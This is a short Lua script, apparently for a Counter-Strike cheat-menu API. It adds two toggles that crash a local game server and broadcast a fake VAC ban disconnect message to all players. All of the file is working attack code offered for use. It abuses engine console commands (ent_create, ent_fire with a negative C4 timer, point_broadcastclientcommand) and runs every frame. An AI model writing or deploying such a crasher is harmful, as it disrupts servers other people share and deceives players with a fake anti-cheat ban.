menu.add_text("About this script", "This script allows you to crash local servers")
menu.add_text("About this script", "even if you are not the server host")
menu.add_text("About this script", "BUT need sv_cheats 1 on the server.")
menu.add_text("About this script", "Good luck!")

local check = menu.add_checkbox("Game crasher", "Crash game for host")
local check2 = menu.add_checkbox("Fake VAC ban message", "Crash server(Fake VAC)")

local function crash()
local prem = check:get()
local prem2 = check2:get()
if prem == true then
    engine.execute_cmd("ent_create planted_c4_training")
    engine.execute_cmd("ent_fire planted_c4_training ActivateSetTimerLength -1")
end
if prem2 == true then
    engine.execute_cmd("ent_create point_broadcastclientcommand")
    engine.execute_cmd('ent_fire point_broadcastclientcommand command "disconnect #SFUI_MainMenu_Vac_Info"')
    engine.execute_cmd("ent_fire point_broadcastclientcommand kill")
end
end
callbacks.add(e_callbacks.PAINT, crash)